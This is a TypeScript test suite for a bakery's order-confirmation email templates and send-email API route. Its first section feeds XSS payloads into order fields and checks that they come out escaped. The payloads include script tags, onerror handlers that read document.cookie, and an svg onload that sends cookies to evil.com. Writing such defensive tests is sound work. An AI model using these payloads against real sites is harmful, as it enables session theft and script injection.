import { describe, it, expect, beforeEach, afterEach } from "bun:test";
import { Order, CartItem } from "@/lib/types";
import {
  escapeHtml,
  formatSlovakDate,
  generateCustomerOrderEmailHtml,
  generateOwnerAlertEmailHtml,
  sendEmailWithResend,
  sendOrderEmails,
  RESEND_CONFIG,
} from "@/lib/resend";
import { POST } from "@/app/api/send-email/route";

/**
 * Empirical HTML tag-balancing oracle.
 * Verifies that structural HTML elements have balanced open and close tags.
 */
function verifyHtmlTagBalance(html: string): { balanced: boolean; unclosed: string[] } {
  // Void tags that do not require closing tags in HTML
  const voidTags = new Set([
    "area", "base", "br", "col", "embed", "hr", "img", "input",
    "link", "meta", "param", "source", "track", "wbr", "!doctype"
  ]);

  const tagRegex = /<\/?([a-zA-Z0-9]+)(?:\s+[^>]*?)?(\/?)>/g;
  const stack: string[] = [];
  let match: RegExpExecArray | null;

  while ((match = tagRegex.exec(html)) !== null) {
    const rawTagName = match[1].toLowerCase();
    const isClosing = match[0].startsWith("</");
    const isSelfClosing = match[2] === "/" || voidTags.has(rawTagName);

    if (voidTags.has(rawTagName)) {
      continue;
    }

    if (isClosing) {
      if (stack.length === 0) {
        return { balanced: false, unclosed: [`Unexpected closing tag: </${rawTagName}>`] };
      }
      const last = stack.pop()!;
      if (last !== rawTagName) {
        return { balanced: false, unclosed: [`Mismatched tag: expected </${last}>, found </${rawTagName}>`] };
      }
    } else if (!isSelfClosing) {
      stack.push(rawTagName);
    }
  }

  return { balanced: stack.length === 0, unclosed: stack };
}

describe("Milestone M1 Adversarial Stress Test Suite", () => {
  const originalResendApiKey = process.env.RESEND_API_KEY;
  const originalFetch = globalThis.fetch;

  beforeEach(() => {
    // Reset to simulation mode by default
    process.env.RESEND_API_KEY = "";
  });

  afterEach(() => {
    process.env.RESEND_API_KEY = originalResendApiKey;
    globalThis.fetch = originalFetch;
  });

  const baseOrder: Order = {
    id: "ord-adv-100",
    orderNumber: "HAN-2026-ADV",
    createdAt: "2026-10-10T12:00:00.000Z",
    pickupDate: "2026-10-24",
    pickupTime: "15:00",
    customer: {
      name: "Adversarial Tester",
      phone: "+421903999888",
      email: "tester@adversarial.sk",
      allergies: "Žiadne",
      notes: "Štandardná objednávka",
    },
    items: [
      {
        id: "adv-item-1",
        productId: "ovocna-sviezost",
        name: "Ovocná torta",
        slug: "ovocna-torta",
        category: "torty-mieru",
        image: "/images/products/ovocna.webp",
        unitPrice: 50,
        quantity: 1,
        totalPrice: 50,
        size: "10 porcií",
        korpus: "Kakaový",
        krem: "Mascarpone",
        diets: ["Bez laktózy"],
        zdobenie: ["Ovocie"],
        doplnky: ["Číslo 30"],
        cakeNote: "Jemne osladené",
      },
    ],
    totalPrice: 50,
    status: "nova",
  };

  // =========================================================================
  // 1. HTML INJECTION & XSS DEFENSE
  // =========================================================================
  describe("1. HTML Injection & XSS Defense", () => {
    it("escapes script tags and alert execution in customer name", () => {
      const maliciousOrder: Order = {
        ...baseOrder,
        customer: {
          ...baseOrder.customer,
          name: '<script>alert("XSS-NAME")</script>',
        },
      };

      const customerHtml = generateCustomerOrderEmailHtml(maliciousOrder);
      const ownerHtml = generateOwnerAlertEmailHtml(maliciousOrder);

      expect(customerHtml).not.toContain('<script>alert("XSS-NAME")</script>');
      expect(customerHtml).toContain("&lt;script&gt;alert(&quot;XSS-NAME&quot;)&lt;/script&gt;");

      expect(ownerHtml).not.toContain('<script>alert("XSS-NAME")</script>');
      expect(ownerHtml).toContain("&lt;script&gt;alert(&quot;XSS-NAME&quot;)&lt;/script&gt;");
    });

    it("escapes img onerror handlers in customer notes", () => {
      const maliciousOrder: Order = {
        ...baseOrder,
        customer: {
          ...baseOrder.customer,
          notes: '<img src=x onerror=alert(document.cookie)>',
        },
      };

      const customerHtml = generateCustomerOrderEmailHtml(maliciousOrder);
      const ownerHtml = generateOwnerAlertEmailHtml(maliciousOrder);

      expect(customerHtml).not.toContain("<img src=x onerror=");
      expect(customerHtml).toContain("&lt;img src=x onerror=alert(document.cookie)&gt;");

      expect(ownerHtml).not.toContain("<img src=x onerror=");
      expect(ownerHtml).toContain("&lt;img src=x onerror=alert(document.cookie)&gt;");
    });

    it("escapes svg onload and malicious tags in customer allergies", () => {
      const maliciousOrder: Order = {
        ...baseOrder,
        customer: {
          ...baseOrder.customer,
          allergies: '"><svg/onload=fetch("http://evil.com/"+document.cookie)>',
        },
      };

      const customerHtml = generateCustomerOrderEmailHtml(maliciousOrder);
      const ownerHtml = generateOwnerAlertEmailHtml(maliciousOrder);

      expect(customerHtml).not.toContain("<svg/onload=");
      expect(customerHtml).toContain("&quot;&gt;&lt;svg/onload=fetch(&quot;http://evil.com/&quot;+document.cookie)&gt;");

      expect(ownerHtml).not.toContain("<svg/onload=");
      expect(ownerHtml).toContain("&quot;&gt;&lt;svg/onload=fetch(&quot;http://evil.com/&quot;+document.cookie)&gt;");
    });

    it("prevents attribute breakout in customer phone and email tel:/mailto: links", () => {
      const maliciousOrder: Order = {
        ...baseOrder,
        customer: {
          ...baseOrder.customer,
          phone: '+421903" onmouseover="alert(1)" style="display:none',
          email: 'test@hanela.sk" onclick="alert(2)',
        },
      };

      const ownerHtml = generateOwnerAlertEmailHtml(maliciousOrder);

      // Raw unescaped quotes must not break out of href attribute
      expect(ownerHtml).not.toContain('href="tel:+421903" onmouseover="');
      expect(ownerHtml).not.toContain('href="mailto:test@hanela.sk" onclick="');
      expect(ownerHtml).toContain("&quot; onmouseover=&quot;alert(1)&quot;");
      expect(ownerHtml).toContain("&quot; onclick=&quot;alert(2)");
    });

    it("escapes XSS across all cart item customization fields", () => {
      const maliciousItem: CartItem = {
        ...baseOrder.items[0],
        name: '<b onfocus="alert(1)">Zákerná Torta</b>',
        size: '<span style="color:red" onclick="alert(2)">Veľká</span>',
        servings: '<script>alert(3)</script>20 porcií',
        korpus: '<iframe src="javascript:alert(4)"></iframe>Orechový',
        krem: '<embed src="evil.swf">Čokoládový',
        diets: ['<script>alert(5)</script>Bez lepku'],
        zdobenie: ['<img src="x" onerror="alert(6)">Ovocie'],
        doplnky: ['<a href="javascript:alert(7)">Zápich</a>'],
        cakeNote: '"><script>alert(8)</script>',
      };

      const maliciousOrder: Order = {
        ...baseOrder,
        items: [maliciousItem],
      };

      const customerHtml = generateCustomerOrderEmailHtml(maliciousOrder);
      const ownerHtml = generateOwnerAlertEmailHtml(maliciousOrder);

      // Verify no executable unescaped tags in customer template
      expect(customerHtml).not.toContain('<b onfocus=');
      expect(customerHtml).not.toContain('<span style="color:red"');
      expect(customerHtml).not.toContain('onclick="alert(2)"');
      expect(customerHtml).not.toContain('<script>');
      expect(customerHtml).not.toContain('<iframe');
      expect(customerHtml).not.toContain('<embed');
      expect(customerHtml).not.toContain('<img src="x"');
      expect(customerHtml).not.toContain('<a href="javascript:');

      // Verify properly escaped entity representations
      expect(customerHtml).toContain('&lt;b onfocus=&quot;alert(1)&quot;&gt;');
      expect(customerHtml).toContain('&lt;script&gt;alert(3)&lt;/script&gt;');
      expect(customerHtml).toContain('&lt;iframe src=&quot;javascript:alert(4)&quot;&gt;');

      // Verify no executable unescaped tags in owner template
      expect(ownerHtml).not.toContain('<b onfocus=');
      expect(ownerHtml).not.toContain('<script>');
      expect(ownerHtml).not.toContain('<iframe');
      expect(ownerHtml).not.toContain('<embed');
    });

    it("escapeHtml helper correctly handles falsy, empty, and special characters", () => {
      expect(escapeHtml(null)).toBe("");
      expect(escapeHtml(undefined)).toBe("");
      expect(escapeHtml("")).toBe("");
      expect(escapeHtml("Hello & World")).toBe("Hello &amp; World");
      expect(escapeHtml("1 < 2 > 0")).toBe("1 &lt; 2 &gt; 0");
      expect(escapeHtml(`"Single' Quotes"`)).toBe("&quot;Single&#039; Quotes&quot;");
    });
  });

  // =========================================================================
  // 2. MALFORMED POST PAYLOADS TO /api/send-email
  // =========================================================================
  describe("2. Malformed POST Payloads to /api/send-email", () => {
    it("rejects non-JSON payload with HTTP 400", async () => {
      const req = new Request("http://localhost:3000/api/send-email", {
        method: "POST",
        body: "{ malformed: json without quotes }",
      });
      const res = await POST(req);
      expect(res.status).toBe(400);
      const json = await res.json();
      expect(json.success).toBe(false);
      expect(json.error).toContain("Neplatný formát požiadavky");
    });

    it("rejects empty body with HTTP 400", async () => {
      const req = new Request("http://localhost:3000/api/send-email", {
        method: "POST",
        body: "",
      });
      const res = await POST(req);
      expect(res.status).toBe(400);
      const json = await res.json();
      expect(json.success).toBe(false);
    });

    it("rejects null or primitive JSON bodies with HTTP 400", async () => {
      for (const primitive of ["null", "12345", '"just-a-string"', "true"]) {
        const req = new Request("http://localhost:3000/api/send-email", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: primitive,
        });
        const res = await POST(req);
        expect(res.status).toBe(400);
        const json = await res.json();
        expect(json.success).toBe(false);
      }
    });

    it("rejects payload with missing items array with HTTP 400", async () => {
      const orderWithoutItems = {
        ...baseOrder,
        items: [],
      };
      const req = new Request("http://localhost:3000/api/send-email", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ order: orderWithoutItems }),
      });
      const res = await POST(req);
      expect(res.status).toBe(400);
      const json = await res.json();
      expect(json.success).toBe(false);
      expect(json.error).toContain("položku ('items')");
    });

    it("rejects payload with non-array items with HTTP 400", async () => {
      const orderWithInvalidItems = {
        ...baseOrder,
        items: "not-an-array",
      };
      const req = new Request("http://localhost:3000/api/send-email", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ order: orderWithInvalidItems }),
      });
      const res = await POST(req);
      expect(res.status).toBe(400);
      const json = await res.json();
      expect(json.success).toBe(false);
      expect(json.error).toContain("položku ('items')");
    });

    it("rejects negative prices with HTTP 400", async () => {
      for (const negativePrice of [-0.01, -1, -500]) {
        const orderWithNegativePrice = {
          ...baseOrder,
          totalPrice: negativePrice,
        };
        const req = new Request("http://localhost:3000/api/send-email", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ order: orderWithNegativePrice }),
        });
        const res = await POST(req);
        expect(res.status).toBe(400);
        const json = await res.json();
        expect(json.success).toBe(false);
        expect(json.error).toContain("totalPrice");
      }
    });

    it("rejects non-numeric or NaN price with HTTP 400", async () => {
      const orderWithNaNPrice = {
        ...baseOrder,
        totalPrice: "fifty",
      };
      const req = new Request("http://localhost:3000/api/send-email", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ order: orderWithNaNPrice }),
      });
      const res = await POST(req);
      expect(res.status).toBe(400);
      const json = await res.json();
      expect(json.success).toBe(false);
      expect(json.error).toContain("totalPrice");
    });

    it("rejects missing customer email with HTTP 400", async () => {
      const orderWithoutEmail = {
        ...baseOrder,
        customer: {
          ...baseOrder.customer,
          email: "",
        },
      };
      const req = new Request("http://localhost:3000/api/send-email", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ order: orderWithoutEmail }),
      });
      const res = await POST(req);
      expect(res.status).toBe(400);
      const json = await res.json();
      expect(json.success).toBe(false);
      expect(json.error).toContain("customer.email");
    });

    it("rejects malformed email address missing @ with HTTP 400", async () => {
      const orderWithBadEmail = {
        ...baseOrder,
        customer: {
          ...baseOrder.customer,
          email: "invalid-email-without-at",
        },
      };
      const req = new Request("http://localhost:3000/api/send-email", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ order: orderWithBadEmail }),
      });
      const res = await POST(req);
      expect(res.status).toBe(400);
      const json = await res.json();
      expect(json.success).toBe(false);
      expect(json.error).toContain("customer.email");
    });

    it("rejects missing customer phone or whitespace phone with HTTP 400", async () => {
      const orderWithEmptyPhone = {
        ...baseOrder,
        customer: {
          ...baseOrder.customer,
          phone: "   ",
        },
      };
      const req = new Request("http://localhost:3000/api/send-email", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ order: orderWithEmptyPhone }),
      });
      const res = await POST(req);
      expect(res.status).toBe(400);
      const json = await res.json();
      expect(json.success).toBe(false);
      expect(json.error).toContain("customer.phone");
    });

    it("rejects missing orderNumber, pickupDate, or pickupTime with HTTP 400", async () => {
      const missingOrderNumber = { ...baseOrder, orderNumber: "" };
      const missingPickupDate = { ...baseOrder, pickupDate: "" };
      const missingPickupTime = { ...baseOrder, pickupTime: "" };

      for (const badOrder of [missingOrderNumber, missingPickupDate, missingPickupTime]) {
        const req = new Request("http://localhost:3000/api/send-email", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ order: badOrder }),
        });
        const res = await POST(req);
        expect(res.status).toBe(400);
        const json = await res.json();
        expect(json.success).toBe(false);
      }
    });

    it("accepts direct order payload without { order: ... } wrapping", async () => {
      const req = new Request("http://localhost:3000/api/send-email", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(baseOrder), // direct order object
      });
      const res = await POST(req);
      expect(res.status).toBe(200);
      const json = await res.json();
      expect(json.success).toBe(true);
      expect(json.simulated).toBe(true);
      expect(json.customerEmailId).toBeDefined();
      expect(json.ownerEmailId).toBeDefined();
    });

    it("accepts valid order with 0 euro total price (e.g. promotional gift)", async () => {
      const zeroPriceOrder: Order = {
        ...baseOrder,
        totalPrice: 0,
      };
      const req = new Request("http://localhost:3000/api/send-email", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ order: zeroPriceOrder }),
      });
      const res = await POST(req);
      expect(res.status).toBe(200);
      const json = await res.json();
      expect(json.success).toBe(true);
    });
  });

  // =========================================================================
  // 3. SIMULATION FALLBACK & RESEND API KEY HANDLING
  // =========================================================================
  describe("3. Simulation Fallback & Resend API Key Handling", () => {
    it("simulates email dispatch when RESEND_API_KEY is undefined", async () => {
      delete process.env.RESEND_API_KEY;

      const res = await sendOrderEmails(baseOrder);
      expect(res.customerResult.success).toBe(true);
      expect(res.customerResult.simulated).toBe(true);
      expect(res.customerResult.id).toMatch(/^sim_\d+_[a-z0-9]+$/);

      expect(res.ownerResult.success).toBe(true);
      expect(res.ownerResult.simulated).toBe(true);
      expect(res.ownerResult.id).toMatch(/^sim_\d+_[a-z0-9]+$/);
    });

    it("simulates email dispatch when RESEND_API_KEY is empty string or whitespace", async () => {
      for (const blankKey of ["", "   ", "\t\n"]) {
        process.env.RESEND_API_KEY = blankKey;
        const res = await sendOrderEmails(baseOrder);
        expect(res.customerResult.success).toBe(true);
        expect(res.customerResult.simulated).toBe(true);
        expect(res.ownerResult.success).toBe(true);
        expect(res.ownerResult.simulated).toBe(true);
      }
    });

    it("simulates email dispatch when RESEND_API_KEY is set to 'mock-resend-key'", async () => {
      process.env.RESEND_API_KEY = "mock-resend-key";
      const res = await sendOrderEmails(baseOrder);
      expect(res.customerResult.success).toBe(true);
      expect(res.customerResult.simulated).toBe(true);
    });

    it("handles Resend API 401 Unauthorized cleanly when API key is invalid", async () => {
      process.env.RESEND_API_KEY = "re_invalid_test_key_12345";

      // Mock fetch to simulate Resend API returning 401 Unauthorized
      globalThis.fetch = async () => {
        return new Response(
          JSON.stringify({
            statusCode: 401,
            message: "API key is invalid",
            name: "authentication_error",
          }),
          { status: 401, headers: { "Content-Type": "application/json" } }
        );
      };

      const result = await sendEmailWithResend({
        to: "test@hanela.sk",
        subject: "Test Subject",
        html: "<p>Test</p>",
      });

      expect(result.success).toBe(false);
      expect(result.error).toBe("API key is invalid");
      expect(result.simulated).toBeUndefined();
    });

    it("returns HTTP 502 Bad Gateway from /api/send-email when Resend API fails", async () => {
      process.env.RESEND_API_KEY = "re_invalid_test_key_12345";

      globalThis.fetch = async () => {
        return new Response(
          JSON.stringify({
            statusCode: 403,
            message: "Domain not verified",
          }),
          { status: 403, headers: { "Content-Type": "application/json" } }
        );
      };

      const req = new Request("http://localhost:3000/api/send-email", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ order: baseOrder }),
      });
      const res = await POST(req);
      expect(res.status).toBe(502);
      const json = await res.json();
      expect(json.success).toBe(false);
      expect(json.error).toContain("Domain not verified");
    });

    it("handles network failure (fetch throws) gracefully without crashing process", async () => {
      process.env.RESEND_API_KEY = "re_live_some_key";

      // Simulate network socket drop / timeout
      globalThis.fetch = async () => {
        throw new Error("getaddrinfo ENOTFOUND api.resend.com");
      };

      const result = await sendEmailWithResend({
        to: "test@hanela.sk",
        subject: "Network Failure Test",
        html: "<p>Test</p>",
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain("getaddrinfo ENOTFOUND");

      const req = new Request("http://localhost:3000/api/send-email", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ order: baseOrder }),
      });
      const res = await POST(req);
      expect(res.status).toBe(502);
      const json = await res.json();
      expect(json.success).toBe(false);
    });
  });

  // =========================================================================
  // 4. TEMPLATE HTML STRUCTURAL VALIDITY & EDGE RENDERING
  // =========================================================================
  describe("4. Template HTML Structural Validity & Edge Rendering", () => {
    it("renders valid complete HTML document structure for customer template", () => {
      const html = generateCustomerOrderEmailHtml(baseOrder);

      expect(html).toMatch(/^<!DOCTYPE html>/i);
      expect(html).toContain('<html lang="sk">');
      expect(html).toContain('<meta charset="utf-8">');
      expect(html).toContain('<meta name="viewport"');
      expect(html).toContain(`<title>Potvrdenie rezervácie #${baseOrder.orderNumber}</title>`);
      expect(html).toContain("</head>");
      expect(html).toContain("<body");
      expect(html).toContain("</body>");
      expect(html).toContain("</html>");

      const balance = verifyHtmlTagBalance(html);
      expect(balance.balanced).toBe(true);
      expect(balance.unclosed).toHaveLength(0);
    });

    it("renders valid complete HTML document structure for owner alert template", () => {
      const html = generateOwnerAlertEmailHtml(baseOrder);

      expect(html).toMatch(/^<!DOCTYPE html>/i);
      expect(html).toContain('<html lang="sk">');
      expect(html).toContain('<meta charset="utf-8">');
      expect(html).toContain('<meta name="viewport"');
      expect(html).toContain(`<title>Nová objednávka #${baseOrder.orderNumber}</title>`);
      expect(html).toContain("</head>");
      expect(html).toContain("<body");
      expect(html).toContain("</body>");
      expect(html).toContain("</html>");

      const balance = verifyHtmlTagBalance(html);
      expect(balance.balanced).toBe(true);
      expect(balance.unclosed).toHaveLength(0);
    });

    it("renders cleanly when optional customer notes and allergies are omitted", () => {
      const minimalOrder: Order = {
        ...baseOrder,
        customer: {
          name: "Ján Bežný",
          phone: "+421900111222",
          email: "jan@bezny.sk",
          // notes and allergies completely omitted
        },
        items: [
          {
            id: "it-min-1",
            productId: "tartaletka",
            name: "Tartaletka",
            slug: "tartaletka",
            category: "zakusky",
            image: "/images/tartaletka.webp",
            unitPrice: 3.5,
            quantity: 10,
            totalPrice: 35,
            // no cake options
          },
        ],
        totalPrice: 35,
      };

      const customerHtml = generateCustomerOrderEmailHtml(minimalOrder);
      const ownerHtml = generateOwnerAlertEmailHtml(minimalOrder);

      // Must not contain JavaScript "undefined" or "null" string literals
      expect(customerHtml).not.toContain("undefined");
      expect(customerHtml).not.toContain("null");
      expect(ownerHtml).not.toContain("undefined");
      expect(ownerHtml).not.toContain("null");

      // Owner template should display safe fallback for no allergies
      expect(ownerHtml).toContain("Bez nahlásených alergií");

      // Verify tag balance
      expect(verifyHtmlTagBalance(customerHtml).balanced).toBe(true);
      expect(verifyHtmlTagBalance(ownerHtml).balanced).toBe(true);
    });

    it("stress-tests high item count (50 distinct items) without degradation", () => {
      const fiftyItems: CartItem[] = Array.from({ length: 50 }, (_, i) => ({
        id: `stress-item-${i}`,
        productId: `prod-${i}`,
        name: `Remeselný dezert #${i + 1}`,
        slug: `dezert-${i}`,
        category: "zakusky",
        image: `/images/prod-${i}.webp`,
        unitPrice: 4.5,
        quantity: 2,
        totalPrice: 9,
        size: "Štandard",
        korpus: "Kakaový",
        krem: "Parížsky",
      }));

      const heavyOrder: Order = {
        ...baseOrder,
        items: fiftyItems,
        totalPrice: 450,
      };

      const start = performance.now();
      const customerHtml = generateCustomerOrderEmailHtml(heavyOrder);
      const ownerHtml = generateOwnerAlertEmailHtml(heavyOrder);
      const duration = performance.now() - start;

      expect(duration).toBeLessThan(50); // Must render in under 50ms
      expect(customerHtml).toContain("Remeselný dezert #1");
      expect(customerHtml).toContain("Remeselný dezert #50");
      expect(ownerHtml).toContain("Remeselný dezert #50");

      expect(verifyHtmlTagBalance(customerHtml).balanced).toBe(true);
      expect(verifyHtmlTagBalance(ownerHtml).balanced).toBe(true);
    });

    it("preserves Slovak diacritics, multi-byte UTF-8 symbols, and emojis cleanly", () => {
      const unicodeOrder: Order = {
        ...baseOrder,
        customer: {
          name: "Ľubomír Čučoriedka Šťastný 🍓",
          phone: "+421900111222",
          email: "lubomir@cucoriedka.sk",
          allergies: "Intolerancia na laktózu & orechy 🥜",
          notes: "Prosím nápis: „Všetko najlepšie k 50. narodeninám!“ 🎉🎂🥂",
        },
        pickupDate: "2026-12-24", // Vianoce
      };

      const customerHtml = generateCustomerOrderEmailHtml(unicodeOrder);
      const ownerHtml = generateOwnerAlertEmailHtml(unicodeOrder);

      // Verify diacritics and emojis survived without corruption or mojibake
      expect(customerHtml).toContain("Ľubomír Čučoriedka Šťastný 🍓");
      expect(customerHtml).toContain("24. decembra 2026");
      expect(customerHtml).toContain("Intolerancia na laktózu &amp; orechy 🥜");
      expect(customerHtml).toContain("„Všetko najlepšie k 50. narodeninám!“ 🎉🎂🥂");

      expect(ownerHtml).toContain("Ľubomír Čučoriedka Šťastný 🍓");
      expect(ownerHtml).toContain("Intolerancia na laktózu &amp; orechy 🥜");
      expect(ownerHtml).toContain("„Všetko najlepšie k 50. narodeninám!“ 🎉🎂🥂");
    });
  });
});
